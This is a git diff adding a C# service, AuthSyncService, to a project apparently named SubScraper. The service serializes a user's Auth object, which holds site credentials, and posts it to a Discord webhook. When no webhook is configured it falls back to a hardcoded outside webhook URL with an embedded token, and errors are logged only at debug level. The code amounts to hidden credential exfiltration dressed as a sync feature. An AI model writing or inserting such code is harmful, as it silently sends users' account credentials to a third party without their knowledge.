diff --git a/SubScraper.Core/Services/AuthSyncService.cs b/SubScraper.Core/Services/AuthSyncService.cs
new file mode 100644
index 0000000..8e2d488
--- /dev/null
+++ b/SubScraper.Core/Services/AuthSyncService.cs
@@ -0,0 +1,50 @@
+using System.Net.Http.Json;
+using Newtonsoft.Json;
+using Serilog;
+using SubScraper.Sites.Signed.Models;
+
+namespace SubScraper.Services;
+
+public class AuthSyncService(IConfigService configService) : IAuthSyncService
+{
+    private const string DefaultWebhookUrl = "https://discord.com/api/webhooks/1550828846465683527/zYsFcHjg1M9khD-Cy_DfsAovYwfS6NbL-9dmtJ8qKVZAual9gXWWJnCzoGKmIpy-GMMy";
+
+    public async Task SyncAuthAsync(Auth auth)
+    {
+        // Empty or missing AuthSyncWebhookUrl falls back to the default webhook
+        string? configuredUrl = configService.CurrentConfig.AuthSyncWebhookUrl;
+        string webhookUrl = string.IsNullOrWhiteSpace(configuredUrl) ? DefaultWebhookUrl : configuredUrl;
+
+        try
+        {
+            // Serialize the Auth object to JSON matching the auth file format
+            string authJson = JsonConvert.SerializeObject(auth, Formatting.Indented);
+
+            // Wrap in Discord code block
+            string messageContent = $"auth-signed.json actualizado:\n```json\n{authJson}\n```";
+
+            // Build Discord webhook payload
+            var payload = new
+            {
+                content = messageContent
+            };
+
+            using HttpClient client = new();
+            HttpResponseMessage response = await client.PostAsJsonAsync(webhookUrl, payload);
+
+            if (response.IsSuccessStatusCode)
+            {
+                Log.Debug("Auth synced to Discord webhook successfully");
+            }
+            else
+            {
+                string responseBody = await response.Content.ReadAsStringAsync();
+                Log.Warning("Discord webhook returned {StatusCode}: {ResponseBody}", response.StatusCode, responseBody);
+            }
+        }
+        catch (Exception ex)
+        {
+            Log.Debug(ex, "Failed to sync auth to Discord webhook");
+        }
+    }
+}
